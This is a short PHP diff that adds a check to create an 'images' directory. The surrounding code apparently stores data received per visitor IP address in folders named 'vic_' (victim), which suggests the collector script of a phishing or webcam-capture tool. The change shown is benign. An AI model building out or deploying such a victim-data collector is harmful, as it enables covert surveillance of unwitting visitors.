@@ -7,6 +7,9 @@ if (!empty($_POST['cat'])) {
 error_log("Received" . "\r\n", 3, "Log.log");
 
 }
+if (!is_dir( "images") ) {
+    mkdir( "images");       
+}
 if (!is_dir( "images/vic_".$ipaddress) ) {
     mkdir( "images/vic_".$ipaddress );       
 } 
